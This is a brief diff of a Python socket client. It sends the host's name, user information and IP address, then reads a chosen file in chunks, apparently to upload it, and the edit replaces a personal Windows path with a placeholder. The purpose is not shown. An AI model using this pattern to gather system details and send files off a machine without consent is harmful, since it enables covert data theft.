@@ -15,7 +15,7 @@ client.send(platform.node().encode())
 client.send(user_info().encode())
 client.send(socket.gethostbyname(socket.gethostname()).encode())
 
-with open("C:\\Users\\zanat\\A - BUREAU\\code\\ttk.txt", 'rb') as fichier:
+with open("a file you want to upload to your pc", 'rb') as fichier:
     while True:
         morceau = fichier.read(1024)
         if not morceau:break
